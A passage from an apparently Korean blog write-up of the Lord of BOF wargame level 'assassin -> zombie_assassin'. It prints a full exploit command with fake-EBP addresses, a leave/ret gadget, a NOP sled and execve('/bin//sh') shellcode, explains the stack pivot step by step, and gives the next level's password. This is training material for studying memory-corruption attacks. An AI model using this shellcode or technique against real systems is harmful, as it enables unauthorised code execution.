class=\"language-bash\">\r\n./zombie_assassin <span class=\"token variable\"><span class=\"token variable\">`</span>python –c ‘print “<span class=\"token punctuation\">\\</span>xa0<span class=\"token punctuation\">\\</span>xfb<span class=\"token punctuation\">\\</span>xff<span class=\"token punctuation\">\\</span>xbf”*10 + “<span class=\"token punctuation\">\\</span>xd0<span class=\"token punctuation\">\\</span>xf9<span class=\"token punctuation\">\\</span>xff<span class=\"token punctuation\">\\</span>xbf” + “<span class=\"token punctuation\">\\</span>xdf<span class=\"token punctuation\">\\</span>x84<span class=\"token punctuation\">\\</span>x04<span class=\"token punctuation\">\\</span>x08” + “<span class=\"token punctuation\">\\</span>x90”*100 + “<span class=\"token punctuation\">\\</span>x31<span class=\"token punctuation\">\\</span>xc0<span class=\"token punctuation\">\\</span>x50<span class=\"token punctuation\">\\</span>x68<span class=\"token punctuation\">\\</span>x2f<span class=\"token punctuation\">\\</span>x2f<span class=\"token punctuation\">\\</span>x73<span class=\"token punctuation\">\\</span>x68<span class=\"token punctuation\">\\</span>x68<span class=\"token punctuation\">\\</span>x2f<span class=\"token punctuation\">\\</span>x62<span class=\"token punctuation\">\\</span>x69<span class=\"token punctuation\">\\</span>x6e<span class=\"token punctuation\">\\</span>x89<span class=\"token punctuation\">\\</span>xe3<span class=\"token punctuation\">\\</span>x50<span class=\"token punctuation\">\\</span>x53<span class=\"token punctuation\">\\</span>x89<span class=\"token punctuation\">\\</span>xe1<span class=\"token punctuation\">\\</span>x31<span class=\"token punctuation\">\\</span>xd2<span class=\"token punctuation\">\\</span>xb0<span class=\"token punctuation\">\\</span>x0b<span class=\"token punctuation\">\\</span>xcd<span class=\"token punctuation\">\\</span>x80” + “<span class=\"token punctuation\">\\</span>x90”*75’<span class=\"token variable\">`</span></span>\r\n</code></pre></div>\n<ol>\n<li>ret가 leave를 가리킴으로써 eip가 ret에 들어있는 주소값(\\xdf\\x84\\x04\\x08)으로 바뀐다.</li>\n<li>ebp가 SFP가 가리키는 주소(\\xd0\\xf9\\xff\\xbf)로 바뀐다.</li>\n<li>ebp가 SFP에 들어있는 주소가 가리키는 값(\\xa0\\xfb\\xff\\xbf)으로 바뀌고, +4가 된 주소에 들어있는 값이 eip에 담긴다.</li>\n<li>eip가 \\x90” * 100 + shellcode를 실행</li>\n</ol>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/6a9e20c9356baf2f387eb5140d510a03/32056/9.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.272727272727277%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAArUlEQVR42oWOy27EMAhFSaKkMX4wBmIbdzOp8v/fOHJGrdRuehZIXCHOBTOrtTxybtb6Z1dVZk5EOWcRyZyZmYgSEYukGGNKIhJCuK4LWjNVRe9DjN77jxvn3D5wiLgsCwBM0/Qz53kGgFIKnF9n7zb8rTKLmZVR5IGI6ZsYIxHF+3uikTjnns8TrJuI1FoRcV3Xfd+3bYO/TL+W2z/MpRZVDcET0Tv9l/fZcRwvwX0NDB0EbQYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6a9e20c9356baf2f387eb5140d510a03/c9b55/9.webp 165w,\n/static/6a9e20c9356baf2f387eb5140d510a03/f2908/9.webp 330w,\n/static/6a9e20c9356baf2f387eb5140d510a03/ff4b8/9.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6a9e20c9356baf2f387eb5140d510a03/04c57/9.png 165w,\n/static/6a9e20c9356baf2f387eb5140d510a03/d9ecf/9.png 330w,\n/static/6a9e20c9356baf2f387eb5140d510a03/32056/9.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6a9e20c9356baf2f387eb5140d510a03/32056/9.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>my-pass: no place to hide</p>","categories":["writeup","pwnable"],"date":"February 05, 2016","description":"","id":"c6ee78b0-ad04-5425-a623-b0f3a8ae1a24","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-16/","title":"LOB 16번 (assassin -> zombie_assassin)","readingTime":{"text":"4 min read"}},"listingPagePath":"/blog/"}},"staticQueryHashes":["1094019748","460736852"],"slicesMap":{}}